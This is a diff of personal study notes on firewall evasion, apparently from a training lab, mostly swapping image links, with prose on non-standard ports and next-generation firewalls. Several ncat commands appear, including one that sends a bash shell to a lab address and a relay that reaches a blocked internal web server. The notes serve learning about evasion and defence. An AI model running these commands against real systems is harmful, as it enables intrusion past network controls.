@@ -143,9 +143,7 @@ Single flow:
 ### Setting up a Netcat http proxy for NMAP:
 
 
-
-![[Attachments/Pasted image 20240922143053.png]]
-
+![Pasted image 20240922143053](https://github.com/user-attachments/assets/c6d5437f-9d25-45f6-b235-d8b7dd290ad4)
 
 ncat -vv --listen 8081 --proxy-type http
 
@@ -524,36 +522,40 @@ ncat -lvnp 21
 
 ncat 10.10.25.138  21 -e /bin/bash
 
-======20240904160925 insert pic
+![Pasted image 20240924160925](https://github.com/user-attachments/assets/3ae5affe-ea8f-435c-a0a1-ca5806c718c1)
 
 
 Listing available services / ports that are opened:
 
-![[Attachments/Pasted image 20240924160848.png]]
+![Pasted image 20240924160848](https://github.com/user-attachments/assets/3dbd9dc5-ac4a-488a-9ccf-f5efdd619848)
+
 
 The client can't reach the server over the network on port 80 or 8008.
 
-![[Attachments/Pasted image 20240924163354.png]]
+
+![Pasted image 20240924163354](https://github.com/user-attachments/assets/de869533-6b2f-47bf-a04d-5cd4c9cdd962)
 
 Since I'm connected to the server via a reverse shell, I can open the local webserver running on port 80
 
 ncat -lvnp 8008 -c "ncat 10.10.90.19 80"
 
 
-![[Attachments/Pasted image 20240924163735.png]]
+![Pasted image 20240924163735](https://github.com/user-attachments/assets/be94001b-b074-49f1-9359-c598cf6e7f4b)
 
 
 Now I'm able to reach the server on port 8008 , I can se some 200 codes coming from the web App:
 
-![[Attachments/Pasted image 20240924163942.png]]
+![Pasted image 20240924163942](https://github.com/user-attachments/assets/ecb4a1ec-ea2f-47af-aee7-419875cccee0)
 
 
 
-![[Attachments/Pasted image 20240924164127.png]]
+![Pasted image 20240924164127](https://github.com/user-attachments/assets/05f29650-4685-4631-aba3-9e379795630d)
+
 
 Connection state at the Web-Server show the port are bind:
 
-![[Attachments/Pasted image 20240924164556.png]]
+
+![Pasted image 20240924164556](https://github.com/user-attachments/assets/a34ec769-abaa-4668-b082-276333c3b4bb)
 
 
 ### Evasion Using Non-Standard Ports:
@@ -573,12 +575,16 @@ Next-Generation Firewall (NGFW:
 
 Traditional firewalls, such as packet-filtering firewalls, expect a port number to dictate the protocol being used and identify the application. Consequently, if you want to block an application, you need to block a port. Unfortunately, this is no longer valid as many applications camouflage themselves using ports assigned for other applications. 
 
-![[Attachments/Pasted image 20240924210345.png]]
+
+![Pasted image 20240924210345](https://github.com/user-attachments/assets/fcdd09d7-b8dc-4efd-813a-74e6b9305aa9)
+
 
 
 In other words, a port number is no longer enough nor reliable to identify the application being used. Add to this the pervasive use of encryption, for example, via SSL/TLS.
 
-![[Attachments/Pasted image 20240924210137.png]]
+
+![Pasted image 20240924210137](https://github.com/user-attachments/assets/356b1515-1882-496a-9da8-27e824e290fa)
+
 Next-Generation Firewall (NGFW) is designed to handle the new challenges facing modern enterprises. For instance, some of NGFW capabilities include:
 
 Integrate a firewall and a real-time Intrusion Prevention System (IPS). It can stop any detected threat in real-time.
